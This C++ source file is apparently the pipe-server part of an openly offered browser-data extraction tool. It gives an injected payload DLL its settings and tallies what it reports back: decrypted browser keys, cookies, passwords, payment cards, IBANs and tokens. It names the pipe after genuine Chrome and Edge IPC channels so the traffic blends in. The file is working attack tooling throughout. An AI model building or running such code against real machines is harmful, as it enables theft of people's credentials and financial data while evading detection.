// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "pipe_server.hpp"
#include "../core/console.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>

namespace Injector {

    PipeServer::PipeServer(const std::wstring& browserType)
        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {}

    void PipeServer::Create() {
        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                       PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                       1, 4096, 4096, 0, nullptr));

        if (!m_hPipe) {
            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
        }
    }

    // Helper struct for the timeout thread
    struct ConnectContext {
        HANDLE hPipe;
        HANDLE hEvent;
    };

    static DWORD WINAPI ConnectThread(LPVOID lpParam) {
        auto ctx = static_cast<ConnectContext*>(lpParam);
        ConnectNamedPipe(ctx->hPipe, nullptr);
        SetEvent(ctx->hEvent);
        return 0;
    }

    void PipeServer::WaitForClient() {
        // Use a helper thread to implement timeout on synchronous ConnectNamedPipe
        HANDLE hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        if (!hEvent) {
            throw std::runtime_error("CreateEvent failed: " + std::to_string(GetLastError()));
        }

        ConnectContext ctx = { m_hPipe.get(), hEvent };
        HANDLE hThread = CreateThread(nullptr, 0, ConnectThread, &ctx, 0, nullptr);
        if (!hThread) {
            CloseHandle(hEvent);
            throw std::runtime_error("CreateThread failed: " + std::to_string(GetLastError()));
        }

        DWORD waitResult = WaitForSingleObject(hEvent, 30000);
        CloseHandle(hEvent);

        if (waitResult == WAIT_TIMEOUT) {
            // Cancel the blocking ConnectNamedPipe by disconnecting the pipe
            DisconnectNamedPipe(m_hPipe.get());
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            throw std::runtime_error("Payload connection timed out (30s). Injection may have failed.");
        }

        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }

    void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        Sleep(10);
        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
        Sleep(10);
        Write(output.string());
        Sleep(10);
        Write(Core::ToUtf8(m_browserType));
        Sleep(10);
    }

    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error("WriteFile failed");
        }
    }

    void PipeServer::ProcessMessages(bool verbose) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();

        Core::Console console(verbose);

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(4));
                }
                else if (msg.rfind("NO_ABE:", 0) == 0) {
                    console.NoAbeWarning(msg.substr(7));
                    m_stats.noAbe = true;
                }
                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
                    console.AsterKeyDecrypted(msg.substr(10));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                    console.ExtractionResult("Tokens", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                else {
                    if (verbose && !msg.empty()) {
                        console.Debug(msg);
                    }
                }
            }
            accumulated.erase(0, start);
        }
    }

    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();

        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

        wchar_t buffer[128];

        if (lower == L"chrome" || lower == L"chrome-beta") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        } else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        } else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }

        pipeName += buffer;
        return pipeName;
    }

}
